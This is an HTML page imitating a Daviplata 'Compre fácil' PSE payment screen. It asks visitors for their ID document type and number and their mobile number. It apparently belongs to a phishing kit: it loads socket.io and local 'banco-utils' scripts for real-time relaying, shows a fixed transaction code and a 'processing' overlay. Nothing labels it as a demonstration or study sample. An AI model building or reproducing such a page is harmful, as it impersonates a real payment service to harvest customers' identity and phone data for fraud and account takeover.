<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daviplata - Compre fácil</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <img src="img/logo-daviplata.svg" alt="Daviplata Logo" class="logo">
            <div class="header-info">
                <p class="date" id="currentDate"></p>
                <p class="code">Código único CUS: 1986688397</p>
            </div>
        </header>

        <!-- Main Content -->
        <main class="main-content">
            <div class="form-container">
                <h1 class="title">Compre fácil con Daviplata</h1>
                <p class="subtitle">Pagos en línea y PSE</p>

                <h2 class="form-title">Ingrese sus datos</h2>

                <form class="form" id="daviForm">
                    <div class="input-group">
                        <div class="select-wrapper">
                            <select id="documentType" class="form-input" required>
                                <option value="">Tipo de documento</option>
                                <option value="CC">Cédula de Ciudadanía</option>
                                <option value="CE">Cédula de Extranjería</option>
                                <option value="TI">Tarjeta de Identidad</option>
                            </select>
                            <img src="img/icono-abajo-drop.svg" alt="dropdown" class="dropdown-icon">
                        </div>
                    </div>

                    <div class="input-group">
                        <input 
                            type="text" 
                            id="documentNumber" 
                            class="form-input" 
                            placeholder="Número de documento"
                            maxlength="10"
                            required
                        >
                    </div>

                    <div class="input-group">
                        <input 
                            type="text" 
                            id="phoneNumber" 
                            class="form-input" 
                            placeholder="Número de celular"
                            maxlength="10"
                            required
                        >
                    </div>

                    <div class="button-group">
                        <button type="button" class="btn btn-cancel">Cancelar</button>
                        <button type="button" class="btn btn-continue" id="btnContinue" disabled>Continuar</button>
                    </div>
                </form>
            </div>
        </main>
    </div>

    <!-- Overlay de carga -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <img src="img/loader.gif" alt="Cargando..." class="loader">
            <p class="loading-text">Procesando información...</p>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/banco-utils.js"></script>
    <script src="/js/simple-validation.js"></script>
    <script src="script-optimized.js"></script>
</body>
</html>
